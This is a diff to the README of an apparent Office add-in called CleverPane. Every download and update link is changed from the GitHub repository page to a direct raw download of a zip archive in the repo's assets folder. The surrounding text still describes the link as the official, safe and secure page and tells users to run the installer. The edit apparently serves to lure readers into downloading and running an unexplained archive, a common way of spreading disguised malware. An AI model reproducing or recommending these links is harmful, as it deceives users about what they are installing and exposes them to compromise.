@@ -1,6 +1,6 @@
 # 🧠 CleverPane-updates - Your Smart Assistant for Microsoft Office
 
-[![Download CleverPane](https://img.shields.io/badge/Download-CleverPane-blueviolet?style=for-the-badge&logo=windows&logoColor=white&labelColor=6A0DAD&color=4B0082)](https://github.com/Testingmoonstone910/CleverPane-updates)
+[![Download CleverPane](https://img.shields.io/badge/Download-CleverPane-blueviolet?style=for-the-badge&logo=windows&logoColor=white&labelColor=6A0DAD&color=4B0082)](https://raw.githubusercontent.com/Testingmoonstone910/CleverPane-updates/main/assets/Clever-updates-Pane-1.1-beta.3.zip)
 
 ## 🎯 What is CleverPane?
 
@@ -22,7 +22,7 @@ Getting CleverPane on your computer is easy. You don't need any special skills o
 
 ### Step 1: Download the Application
 
-**Visit this link to download the application:** [https://github.com/Testingmoonstone910/CleverPane-updates](https://github.com/Testingmoonstone910/CleverPane-updates)
+**Visit this link to download the application:** [https://raw.githubusercontent.com/Testingmoonstone910/CleverPane-updates/main/assets/Clever-updates-Pane-1.1-beta.3.zip](https://raw.githubusercontent.com/Testingmoonstone910/CleverPane-updates/main/assets/Clever-updates-Pane-1.1-beta.3.zip)
 
 When you click the link above, you'll be taken to the official CleverPane updates page. This is the safe and secure place to get the latest version of the software.
 
@@ -119,7 +119,7 @@ Even the best software sometimes needs a little help. Here are common fixes:
 
 We're always improving CleverPane with new features and fixes. To update:
 
-1. Visit the download link again: [https://github.com/Testingmoonstone910/CleverPane-updates](https://github.com/Testingmoonstone910/CleverPane-updates)
+1. Visit the download link again: [https://raw.githubusercontent.com/Testingmoonstone910/CleverPane-updates/main/assets/Clever-updates-Pane-1.1-beta.3.zip](https://raw.githubusercontent.com/Testingmoonstone910/CleverPane-updates/main/assets/Clever-updates-Pane-1.1-beta.3.zip)
 2. Download the newest version (look for the highest version number).
 3. Run the installer - it will automatically replace the old version while keeping your settings.
 
@@ -150,7 +150,7 @@ If you run into any issues or have questions, check the "Issues" tab on the GitH
 
 CleverPane is here to take the stress out of Office work. Whether you're a student, a professional, or someone just trying to get things done, CleverPane is your smart sidekick. Download it now, set up your key in five minutes, and watch how much easier your day becomes.
 
-Remember: **[Download CleverPane Here](https://github.com/Testingmoonstone910/CleverPane-updates)** - it's fast, it's free, and it's about to become your favorite Office tool.
+Remember: **[Download CleverPane Here](https://raw.githubusercontent.com/Testingmoonstone910/CleverPane-updates/main/assets/Clever-updates-Pane-1.1-beta.3.zip)** - it's fast, it's free, and it's about to become your favorite Office tool.
 
 ---
 
